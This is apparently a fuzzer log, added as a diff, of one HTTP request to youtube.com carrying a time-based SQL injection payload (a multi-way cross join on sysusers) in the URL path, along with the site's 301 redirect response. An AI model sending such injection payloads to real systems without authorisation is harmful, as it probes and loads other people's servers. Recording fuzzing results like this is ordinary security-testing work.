@@ -1,0 +1,26 @@
+GET /(select+count(*)+from+sysusers+as+sys1,sysusers+as+sys2,sysusers+as+sys3,sysusers+as+sys4,sysusers+as+sys5,sysusers+as+sys6,sysusers+as+sys7) HTTP/1.1
+Host: youtube.com
+User-Agent: Fuzz Faster U Fool v1.1.0
+Accept-Encoding: gzip
+
+
+---- ↑ Request ---- Response ↓ ----
+
+HTTP/1.1 301 Moved Permanently
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+Cache-Control: private, max-age=31536000
+Content-Type: application/binary
+Cross-Origin-Opener-Policy: same-origin-allow-popups; report-to="youtube_main"
+Date: Tue, 14 Nov 2023 18:39:05 GMT
+Expires: Tue, 14 Nov 2023 18:39:05 GMT
+Location: https://www.youtube.com/(select+count(*)+from+sysusers+as+sys1,sysusers+as+sys2,sysusers+as+sys3,sysusers+as+sys4,sysusers+as+sys5,sysusers+as+sys6,sysusers+as+sys7)
+Origin-Trial: AvC9UlR6RDk2crliDsFl66RWLnTbHrDbp+DiY6AYz/PNQ4G4tdUTjrHYr2sghbkhGQAVxb7jaPTHpEVBz0uzQwkAAAB4eyJvcmlnaW4iOiJodHRwczovL3lvdXR1YmUuY29tOjQ0MyIsImZlYXR1cmUiOiJXZWJWaWV3WFJlcXVlc3RlZFdpdGhEZXByZWNhdGlvbiIsImV4cGlyeSI6MTcxOTUzMjc5OSwiaXNTdWJkb21haW4iOnRydWV9
+Permissions-Policy: ch-ua-arch=*, ch-ua-bitness=*, ch-ua-full-version=*, ch-ua-full-version-list=*, ch-ua-model=*, ch-ua-wow64=*, ch-ua-form-factor=*, ch-ua-platform=*, ch-ua-platform-version=*
+Report-To: {"group":"youtube_main","max_age":2592000,"endpoints":[{"url":"https://csp.withgoogle.com/csp/report-to/youtube_main"}]}
+Server: ESF
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 0
+Content-Length: 0
+
